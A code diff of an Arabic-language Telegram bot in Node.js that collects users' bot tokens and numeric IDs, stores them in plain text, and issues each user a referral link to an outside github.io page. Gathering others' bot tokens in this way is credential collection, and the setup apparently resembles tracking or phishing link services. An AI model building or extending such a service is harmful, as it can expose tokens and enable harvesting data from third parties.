@@ -18,31 +18,34 @@ function saveUsers(users) {
 const users = loadUsers();
 
 mainBot.start((ctx) => {
-  ctx.reply('👋 أهلاً بكن ماهوى أسمك🤔:');
+  ctx.reply('👋 أهلاً بك، ما هو اسمك؟ 🤔');
 });
 
 mainBot.on('text', (ctx) => {
   const chatId = ctx.chat.id.toString();
   const text = ctx.message.text;
-
-  if (!users[chatId]) {
-    if (/^\d{9,}$/.test(text) || text.includes(':')) {
-      if (!users[chatId]) users[chatId] = {};
-      if (!users[chatId].token && text.includes(':')) {
-        users[chatId].token = text;
-        ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
-      } else if (!users[chatId].id && /^\d{9,}$/.test(text)) {
-        users[chatId].id = text;
-        ctx.reply(`✅ تم الحفظ!
-رابطك الخاص:
+  
+  if (!users[chatId]) users[chatId] = {};
+  
+  if (!users[chatId].token && text.includes(':')) {
+    users[chatId].token = text;
+    ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
+    saveUsers(users);
+  } else if (!users[chatId].id && /^\d{9,}$/.test(text)) {
+    users[chatId].id = text;
+    ctx.reply(`✅ تم الحفظ بنجاح!
+📎 رابطك الخاص:
 https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
-        saveUsers(users);
-      }
-    }
+    saveUsers(users);
+  } else if (!users[chatId].token || !users[chatId].id) {
+    ctx.reply('⚠️ أرسل التوكن (Token) أو الـ ID فقط.');
+  } else {
+    ctx.reply('✅ بياناتك مسجلة مسبقًا.');
   }
 });
 
 mainBot.launch();
-console.log('🤖 تم تشغيل البوت!');
+console.log('🤖 البوت شغّال بنجاح!');
 
+// (اختياري): يمنع Render من إيقاف الخدمة
 setInterval(() => {}, 1000);
